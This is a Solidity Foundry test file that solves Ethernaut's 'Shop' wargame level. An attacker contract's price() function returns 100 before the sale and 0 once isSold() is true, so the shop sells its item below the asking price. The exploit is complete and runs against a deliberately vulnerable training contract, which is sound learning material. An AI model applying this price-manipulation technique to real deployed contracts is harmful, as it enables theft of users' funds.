pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/21-Shop/Shop.sol";
import "../../src/ethernaut/21-Shop/ShopFactory.sol";

contract AttackShop {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() public {
        shop.buy();
    }
}

contract ShopTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        ShopFactory factory = new ShopFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);

        Shop shop = Shop(levelAddress);

        //attack contract
        AttackShop attackShop = new AttackShop(shop);

        attackShop.attack();

        console.log(shop.price());

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
